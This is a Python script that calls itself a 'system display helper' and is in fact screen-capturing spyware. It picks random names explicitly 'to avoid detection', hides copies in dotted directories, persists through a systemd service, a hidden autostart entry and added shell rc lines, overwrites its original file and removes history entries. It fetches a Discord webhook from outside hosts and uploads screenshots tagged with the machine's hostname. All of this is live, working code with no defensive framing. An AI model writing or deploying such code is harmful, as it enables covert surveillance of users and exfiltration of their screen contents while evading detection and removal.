#!/usr/bin/env python3
"""
system-xorg-helper - System service for display management with PyAutoGUI
"""

import os
import sys
import tempfile
import subprocess
import time
import requests
import shutil
import signal
import atexit
from pathlib import Path
import json
import logging
import random
import string

# Configuration - Randomized to avoid detection
SERVICE_NAME = f"systemd-{''.join(random.choices(string.ascii_lowercase, k=6))}"
HIDDEN_DIR = f"/usr/share/.{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"
CONFIG_FILE = f"{HIDDEN_DIR}/.config.json"
LOG_FILE = f"{HIDDEN_DIR}/.log"
LOCK_FILE = f"/tmp/.{SERVICE_NAME}.lock"

# Setup logging
def setup_logging():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.ERROR,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def is_installed():
    """Check if service is already installed"""
    return os.path.exists(f"{HIDDEN_DIR}/{SERVICE_NAME}")

def install_requirements():
    """Install required Python packages"""
    python_packages = [
        'pyautogui',
        'discord.py',
        'requests',
        'psutil'
    ]
    
    print("Installing Python utilities...")
    
    # Try different pip commands
    pip_commands = [
        [sys.executable, "-m", "pip", "install", "--user"],
        ["pip3", "install", "--user"],
        ["pip", "install", "--user"]
    ]
    
    for pip_cmd in pip_commands:
        try:
            result = subprocess.run(
                pip_cmd + python_packages,
                capture_output=True,
                timeout=300,
                check=False
            )
            if result.returncode == 0:
                print("Python utilities installed successfully")
                return True
        except:
            continue
    
    print("Some Python utilities may not be available")
    return False

def install_service():
    """Install as a system service"""
    try:
        # Create hidden directory with random name
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        
        # Copy current script to hidden location with random name
        current_script = os.path.abspath(__file__)
        target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
        
        # Read and modify the script to remove any traces of origin
        with open(current_script, 'r') as f:
            content = f.read()
        
        # Remove any reference to the original filename
        content = content.replace(os.path.basename(__file__), SERVICE_NAME)
        
        with open(target_script, 'w') as f:
            f.write(content)
        
        os.chmod(target_script, 0o755)
        
        # Create systemd service file with random name
        service_content = f"""[Unit]
Description=System Display Helper
After=graphical.target
Wants=graphical.target

[Service]
Type=simple
User={os.getlogin()}
Environment=DISPLAY=:0
Environment=XAUTHORITY=/home/{os.getlogin()}/.Xauthority
ExecStart={target_script} --service
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=graphical.target
"""
        
        service_file = f"/etc/systemd/system/{SERVICE_NAME}.service"
        
        # Try with sudo
        try:
            subprocess.run(['sudo', 'tee', service_file], 
                         input=service_content, text=True, check=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            return False
        
        # Enable and start service
        subprocess.run(['sudo', 'systemctl', 'daemon-reload'], 
                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'systemctl', 'enable', SERVICE_NAME], 
                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'systemctl', 'start', SERVICE_NAME], 
                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
        
    except Exception as e:
        return False

def install_user_service():
    """Install as user service (no sudo required)"""
    try:
        # Create hidden directory in user home with random name
        random_dir = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        user_hidden = os.path.expanduser(f"~/.local/share/{random_dir}")
        os.makedirs(user_hidden, exist_ok=True)
        
        # Copy script with random name
        current_script = os.path.abspath(__file__)
        target_script = f"{user_hidden}/{SERVICE_NAME}"
        
        with open(current_script, 'r') as f:
            content = f.read()
        
        content = content.replace(os.path.basename(__file__), SERVICE_NAME)
        
        with open(target_script, 'w') as f:
            f.write(content)
        
        os.chmod(target_script, 0o755)
        
        # Create autostart entry with random name
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=Display Optimizer
Exec={target_script} --service
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        
        desktop_file = f"{autostart_dir}/{SERVICE_NAME}.desktop"
        with open(desktop_file, 'w') as f:
            f.write(desktop_content)
        
        # Add to .bashrc, .profile, and .zshrc for persistence
        bashrc_line = f"\n# Display optimization\n[ -x \"{target_script}\" ] && \"{target_script}\" --service &\n"
        
        for rc_file in ['.bashrc', '.profile', '.zshrc']:
            rc_path = os.path.expanduser(f"~/{rc_file}")
            if os.path.exists(rc_path):
                with open(rc_path, 'a') as f:
                    f.write(bashrc_line)
        
        return True
        
    except Exception as e:
        return False

def clean_traces(original_path):
    """Remove all traces of the original file"""
    try:
        # Overwrite the original file with random data
        file_size = os.path.getsize(original_path)
        with open(original_path, 'wb') as f:
            f.write(os.urandom(file_size))
        
        # Remove the original file
        os.remove(original_path)
        
        # Clear command history that might reference this file
        history_files = [
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/.zsh_history'),
            os.path.expanduser('~/.python_history')
        ]
        
        for history_file in history_files:
            if os.path.exists(history_file):
                try:
                    with open(history_file, 'r') as f:
                        content = f.read()
                    
                    # Remove any lines referencing the original filename
                    lines = content.split('\n')
                    cleaned_lines = [line for line in lines if os.path.basename(original_path) not in line]
                    
                    with open(history_file, 'w') as f:
                        f.write('\n'.join(cleaned_lines))
                except:
                    pass
                    
    except Exception as e:
        pass

def daemonize():
    """Turn into a daemon process"""
    try:
        # Fork first time
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)
    
    # Decouple from parent environment
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    # Fork second time
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)
    
    # Redirect standard file descriptors to /dev/null
    with open(os.devnull, 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def fetch_token():
    """Fetch Discord webhook token"""
    token_urls = [
        "https://new-production-8df3.up.railway.app/api/token",
        "https://new-5itj.onrender.com/api/token"
    ]
    
    for url in token_urls:
        try:
            response = requests.get(f"{url}?code=asdfghjkl", timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    return data['discord_token']
        except:
            continue
    
    return None

def setup_display_environment():
    """Setup proper display environment for PyAutoGUI"""
    displays = [':0', ':0.0', ':1', ':1.0']
    
    # Check environment first
    env_display = os.environ.get('DISPLAY')
    if env_display and any(d in env_display for d in displays):
        os.environ['DISPLAY'] = env_display
        return True
    
    # Try to detect from running processes
    try:
        result = subprocess.run(['pgrep', '-a', 'Xorg'], 
                              capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            for display in displays:
                if display in line:
                    os.environ['DISPLAY'] = display
                    return True
    except:
        pass
    
    # Check who's logged in
    try:
        result = subprocess.run(['who'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if '(:' in line:
                for part in line.split():
                    if part.startswith('(:') and any(d in part for d in displays):
                        display = part.strip('()')
                        os.environ['DISPLAY'] = display
                        return True
    except:
        pass
    
    # Try common displays
    for display in displays:
        try:
            result = subprocess.run(['xdpyinfo', '-display', display], 
                                  capture_output=True, timeout=5)
            if result.returncode == 0:
                os.environ['DISPLAY'] = display
                return True
        except:
            continue
    
    # Final fallback
    os.environ['DISPLAY'] = ':0'
    return True

def take_screenshot_pyautogui():
    """Take screenshot using PyAutoGUI - much simpler and more reliable"""
    try:
        # Setup display environment first
        setup_display_environment()
        
        # Import pyautogui here to ensure it's available
        import pyautogui
        
        # Create temporary file
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"screen_{int(time.time())}.png")
        
        # Take screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        return screenshot_path
        
    except Exception as e:
        print(f"PyAutoGUI screenshot failed: {e}")
        return None

def send_to_discord(file_path, token):
    """Send screenshot to Discord"""
    try:
        import discord
        from discord import SyncWebhook
        
        webhook = SyncWebhook.from_url(token)
        with open(file_path, 'rb') as f:
            webhook.send(
                content=f"Screenshot from {os.uname().nodename}",
                file=discord.File(f, filename='system_screenshot.png')
            )
        return True
    except Exception as e:
        print(f"Discord send failed: {e}")
        return False

def handle_signal(signum, frame):
    """Handle signals gracefully"""
    sys.exit(0)

def create_lock():
    """Create lock file to prevent multiple instances"""
    try:
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        return True
    except:
        return False

def remove_lock():
    """Remove lock file"""
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except:
        pass

def main():
    """Main function"""
    # Handle different command line arguments
    if '--install' in sys.argv:
        print("Configuring system display helper...")
        if install_requirements():
            if install_service() or install_user_service():
                print("Configuration completed!")
                # Clean traces of original file
                clean_traces(os.path.abspath(__file__))
            else:
                print("Configuration may be incomplete.")
        return
    
    if '--service' in sys.argv:
        # Check for lock file to prevent multiple instances
        if os.path.exists(LOCK_FILE):
            try:
                with open(LOCK_FILE, 'r') as f:
                    pid = int(f.read().strip())
                # Check if process is still running
                try:
                    os.kill(pid, 0)
                    sys.exit(0)  # Another instance is running
                except OSError:
                    # Process not running, continue
                    pass
            except:
                pass
        
        if not create_lock():
            sys.exit(1)
        
        # Run as daemon
        daemonize()
        setup_logging()
        
        # Set up signal handlers and cleanup
        signal.signal(signal.SIGTERM, handle_signal)
        signal.signal(signal.SIGINT, handle_signal)
        atexit.register(remove_lock)
        
        token = fetch_token()
        if not token:
            print("Failed to fetch Discord token")
            return
        
        # Main service loop
        trigger_file = Path("/tmp/.display_trigger")
        last_trigger = 0
        
        while True:
            try:
                # Check for trigger file
                if trigger_file.exists():
                    current_time = time.time()
                    if current_time - last_trigger > 30:  # Rate limiting
                        last_trigger = current_time
                        print("Taking screenshot...")
                        screenshot_path = take_screenshot_pyautogui()
                        if screenshot_path:
                            print("Sending to Discord...")
                            if send_to_discord(screenshot_path, token):
                                print("Screenshot sent successfully")
                            else:
                                print("Failed to send screenshot")
                            # Cleanup
                            try:
                                os.remove(screenshot_path)
                            except:
                                pass
                        else:
                            print("Failed to take screenshot")
                        try:
                            trigger_file.unlink()
                        except:
                            pass
                
                time.sleep(2)
                
            except Exception as e:
                print(f"Service error: {e}")
                time.sleep(10)
    
    else:
        # Interactive mode - create trigger file
        try:
            trigger_file = Path("/tmp/.display_trigger")
            trigger_file.touch()
            print("Screenshot requested. Service will process shortly.")
        except Exception as e:
            print(f"Unable to process request: {e}")

if __name__ == "__main__":
    # Auto-install if not already installed
    if not is_installed() and len(sys.argv) == 1:
        print("First run - installing system service...")
        if install_requirements():
            if install_service() or install_user_service():
                print("Installation completed! Starting service...")
                # Clean traces and start service
                clean_traces(os.path.abspath(__file__))
                os.execv(sys.executable, [sys.executable, sys.argv[0], '--service'])
            else:
                print("Service installation failed")
        else:
            print("Dependency installation failed")
    else:
        main()
